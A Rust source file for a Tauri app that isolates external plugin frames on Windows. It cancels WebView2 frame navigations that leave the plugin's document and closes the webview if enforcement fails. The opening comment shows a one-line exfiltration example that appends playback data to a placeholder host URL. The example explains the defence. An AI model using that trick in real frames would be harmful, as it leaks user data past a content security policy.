//! Keeps the frames of external plugins on their own document.
//!
//! A plugin's frame may not contact the network, which its content security
//! policy sees to. That policy cannot stop the frame from going to another
//! address, though, and an address can carry data: `location.href =
//! "https://example.com/?" + whatIsPlaying`. So the browser is told to cancel
//! every navigation of such a frame that leads away from the plugin's document.

use std::sync::atomic::{AtomicBool, Ordering};
use tauri::WebviewWindow;

#[derive(Default)]
pub struct FrameIsolation(AtomicBool);

impl FrameIsolation {
    pub fn available(&self) -> bool {
        self.0.load(Ordering::Acquire)
    }

    #[cfg(any(windows, test))]
    pub fn enable(&self) {
        self.0.store(true, Ordering::Release);
    }

    #[cfg(any(windows, test))]
    pub fn disable(&self) {
        self.0.store(false, Ordering::Release);
    }
}

/// Installs enforcement before navigating to a page that can load plugins.
#[cfg(windows)]
pub fn watch(window: &WebviewWindow, start_url: tauri::Url) -> tauri::Result<()> {
    use crate::plugins::{frame_navigation, FrameNavigation};
    use std::sync::{Arc, Mutex};
    use tauri::Manager;
    use webview2_com::{
        take_pwstr, FrameCreatedEventHandler, FrameNavigationStartingEventHandler,
        Microsoft::Web::WebView2::Win32::{ICoreWebView2Frame2, ICoreWebView2_4},
    };
    use windows::Win32::Foundation::E_FAIL;
    use windows_core::{Interface, PWSTR};

    let app = window.app_handle().clone();
    window.with_webview(move |webview| {
        let controller = webview.controller();
        let frame_controller = controller.clone();
        let frame_app = app.clone();
        let on_frame = FrameCreatedEventHandler::create(Box::new(move |_webview, args| {
            let registered = (|| -> windows_core::Result<()> {
                let args = args.ok_or_else(|| windows_core::Error::from(E_FAIL))?;
                // SAFETY: live event arguments, on the owning browser thread.
                let frame = unsafe { args.Frame()? }.cast::<ICoreWebView2Frame2>()?;
                let home: Arc<Mutex<Option<String>>> = Arc::default();
                let navigation_app = frame_app.clone();
                let navigation_controller = frame_controller.clone();
                let on_navigation =
                    FrameNavigationStartingEventHandler::create(Box::new(move |_frame, args| {
                        let checked = (|| -> windows_core::Result<()> {
                            let args = args.ok_or_else(|| windows_core::Error::from(E_FAIL))?;
                            // Cancel before inspecting anything: errors must not allow navigation.
                            // SAFETY: live navigation event, on the owning browser thread.
                            unsafe { args.SetCancel(true)? };
                            let mut uri = PWSTR::null();
                            // SAFETY: the COM call initializes the out pointer, freed by take_pwstr.
                            let uri = unsafe {
                                args.Uri(&mut uri)?;
                                take_pwstr(uri)
                            };
                            let mut home =
                                home.lock().map_err(|_| windows_core::Error::from(E_FAIL))?;
                            match frame_navigation(home.as_deref(), &uri) {
                                FrameNavigation::Adopt => *home = Some(uri),
                                FrameNavigation::Allow => {}
                                FrameNavigation::Cancel => return Ok(()),
                            }
                            // SAFETY: the navigation above was explicitly allowed.
                            unsafe { args.SetCancel(false) }
                        })();
                        if let Err(err) = checked {
                            close_unprotected(&navigation_app, &navigation_controller, &err);
                        }
                        Ok(())
                    }));
                let mut token = 0i64;
                // SAFETY: live frame and event handler on the owning browser thread.
                unsafe { frame.add_NavigationStarting(&on_navigation, &mut token) }
            })();
            if let Err(err) = registered {
                close_unprotected(&frame_app, &frame_controller, &err);
            }
            Ok(())
        }));
        let mut token = 0i64;
        // SAFETY: controller and callback belong to this browser thread.
        let registered = unsafe {
            controller
                .CoreWebView2()
                .and_then(|core| core.cast::<ICoreWebView2_4>())
                .and_then(|core| core.add_FrameCreated(&on_frame, &mut token))
        };
        match registered {
            Ok(()) => app.state::<FrameIsolation>().enable(),
            Err(err) => log_error!("external plugins disabled: cannot watch frames: {err}"),
        }
    })?;
    #[cfg(debug_assertions)]
    {
        crate::dev_inject::start(window, start_url.as_str());
        Ok(())
    }
    #[cfg(not(debug_assertions))]
    window.navigate(start_url)
}

#[cfg(windows)]
fn close_unprotected(
    app: &tauri::AppHandle,
    controller: &webview2_com::Microsoft::Web::WebView2::Win32::ICoreWebView2Controller,
    error: &windows_core::Error,
) {
    use tauri::Manager;
    app.state::<FrameIsolation>().disable();
    log_error!("closing webview: native plugin isolation failed: {error}");
    // Queuing window destruction would let the current navigation continue first.
    // SAFETY: called from the controller's own native event handlers.
    if let Err(err) = unsafe { controller.Close() } {
        log_error!("cannot close an unprotected webview: {err}");
        std::process::exit(1);
    }
}

/// No native frame-navigation enforcement exists here; readiness stays false.
#[cfg(not(windows))]
pub fn watch(window: &WebviewWindow, start_url: tauri::Url) -> tauri::Result<()> {
    window.navigate(start_url)
}
